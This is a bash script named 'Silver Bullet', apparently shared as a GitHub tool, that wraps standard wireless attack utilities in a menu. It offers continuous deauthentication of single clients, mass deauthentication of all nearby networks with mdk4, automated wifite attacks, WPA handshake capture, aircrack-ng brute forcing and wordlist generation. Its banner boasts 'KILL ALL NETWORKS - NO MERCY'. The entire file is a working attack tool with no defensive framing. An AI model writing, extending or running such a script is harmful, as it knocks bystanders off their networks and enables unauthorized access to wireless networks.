#!/bin/bash

# --- Color Scheme (Fixed echo -e) ---
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
WHITE='\033[1;37m'
NC='\033[0m'

cleanup() {
    echo -e "\n${RED}[!] SHUTTING DOWN SILVERBULLET...${NC}"
    if [ ! -z "$MON_IFACE" ]; then airmon-ng stop $MON_IFACE > /dev/null 2>&1; fi
    systemctl restart NetworkManager
    rm -f /tmp/scan_data*
    echo -e "${GREEN}[+] System Restored.${NC}"
    exit
}
trap cleanup SIGINT

show_banner() {
    clear
    echo -e "${RED}"
    echo "          _______  _ _                 "
    echo "         /   _   \| | |                "
    echo "        |   ( )   | | |  SILVER BULLET EX "
    echo "         \  ___  /| | |      -- V.1 --    "
    echo "          /_/ \_\ |_|_|   GITHUB EDITION  "
    echo -e "${WHITE}"
    echo -e "      [+] Interface: ${GREEN}${MON_IFACE}${WHITE}"
    echo -e "      [+] Status:    ${YELLOW}Armed & Lethal${WHITE}"
    echo -e "${PURPLE}   <<<< KILL ALL NETWORKS - NO MERCY >>>>${NC}"
    echo "------------------------------------------------------------"
}

# --- Automatic Interface Selection ---
select_interface() {
    clear
    echo -e "${CYAN}[*] Searching for WiFi Interfaces...${NC}"
    # ดึงรายชื่อ wlan ทั้งหมด
    INTERFACES=($(nmcli -t -f DEVICE device | grep wlan))
    
    if [ ${#INTERFACES[@]} -eq 0 ]; then
        echo -e "${RED}[-][Error] No WiFi adapter found!${NC}"
        exit 1
    fi

    echo -e "${YELLOW}[!] Select your Interface (e.g. wlan0 or wlan1):${NC}"
    for i in "${!INTERFACES[@]}"; do
        echo -e "$((i+1))) ${WHITE}${INTERFACES[$i]}${NC}"
    done
    
    echo -n -e "${CYAN}Choose index: ${NC}"
    read idx
    SELECTED_IFACE=${INTERFACES[$((idx-1))]}

    echo -e "${YELLOW}[*] Preparing $SELECTED_IFACE...${NC}"
    airmon-ng check kill > /dev/null 2>&1
    airmon-ng start $SELECTED_IFACE > /dev/null 2>&1
    
    # ตรวจสอบชื่อ interface หลังเปลี่ยนเป็น monitor mode
    MON_IFACE=$(iw dev | grep "Interface" | awk '{print $2}' | grep "mon" | head -n 1)
    if [ -z "$MON_IFACE" ]; then MON_IFACE="${SELECTED_IFACE}"; fi
    
    echo -e "${GREEN}[+] Ready on $MON_IFACE!${NC}"
    sleep 1
}

# --- Persistent Scan Display ---
scan_and_hold() {
    echo -e "${CYAN}[*] Scanning... Press [Ctrl+C] to LOCK results.${NC}"
    airodump-ng --output-format csv -w /tmp/scan_data $MON_IFACE
    
    clear
    show_banner
    echo -e "${GREEN}🎯 TARGET LIST (LOCKED):${NC}"
    echo -e "------------------------------------------------------------"
    printf "${WHITE}%-20s %-5s %-5s %-s${NC}\n" "BSSID" "CH" "PWR" "ESSID"
    echo -e "------------------------------------------------------------"
    # อ่านไฟล์ CSV และแสดงผล
    [ -f /tmp/scan_data-01.csv ] && awk -F, 'NR>2 && $1!="" {print $1, $4, $9, $14}' /tmp/scan_data-01.csv | while read b c p s; do
        printf "${CYAN}%-20s ${YELLOW}%-5s ${RED}%-5s ${WHITE}%-s${NC}\n" "$b" "$c" "$p" "$s"
    done
    echo -e "------------------------------------------------------------"
    rm -f /tmp/scan_data*
    echo -e "${YELLOW}Press Enter to return to Menu...${NC}"
    read
}

# --- Main Logic ---
select_interface
while true; do
    show_banner
    echo -e "${WHITE}1) ${RED}[SCAN]${NC}   Identify Targets (Persistent View)"
    echo -e "2) ${RED}[DEAUTH]${NC} Kick Single User (Aireplay-ng)"
    echo -e "3) ${RED}[MASS]${NC}   MDK4 Destruction (Kill All)"
    echo -e "4) ${RED}[WIFITE]${NC} Auto-Hack All (Lazy Mode)"
    echo -e "5) ${RED}[GRAB]${NC}   Handshake Capture"
    echo -e "6) ${RED}[CRACK]${NC}  Brute Force (Aircrack-ng)"
    echo -e "7) ${RED}[W-GEN]${NC}  Build Lethal Wordlist"
    echo -e "8) ${RED}[STOP]${NC}   Exit & Cleanup"
    echo "------------------------------------------------------------"
    echo -n -e "${RED}SILVER-BULLET-V1@REAPER:~$ ${NC}"
    read choice

    case $choice in
        1) scan_and_hold ;;
        2) 
            echo -n "Target BSSID: "; read bssid
            echo -n "Channel: "; read ch
            iwconfig $MON_IFACE channel $ch
            xterm -T "DEAUTH" -e "aireplay-ng --deauth 0 -a $bssid $MON_IFACE" &
            ;;
        3) mdk4 $MON_IFACE d ;;
        4) 
            echo -e "${GREEN}[*] Launching Wifite...${NC}"
            # รันผ่าน python3 โดยตรงเพื่อแก้ปัญหา Path ในภาพที่ 3
            sudo python3 -m wifite -i $MON_IFACE --kill
            echo -e "${YELLOW}Press Enter to return...${NC}"
            read
            ;;
        5)
            echo -n "Target BSSID: "; read bssid
            echo -n "Channel: "; read ch
            echo -n "Save Name: "; read fname
            xterm -T "CAPTURING" -e "airodump-ng -c $ch --bssid $bssid -w $fname $MON_IFACE" &
            ;;
        6)
            echo -n "CAP File: "; read capf
            echo -n "Wordlist: "; read wlist
            aircrack-ng -w ${wlist:-wordlist.txt} $capf
            echo "Press Enter..."; read
            ;;
        7)
            echo -n "Keyword: "; read key
            echo "$key" > wordlist.txt
            for i in {0..999}; do echo "$key$i" >> wordlist.txt; done
            echo -e "${GREEN}[+] wordlist.txt Created.${NC}"
            sleep 1
            ;;
        8) cleanup ;;
    esac
done
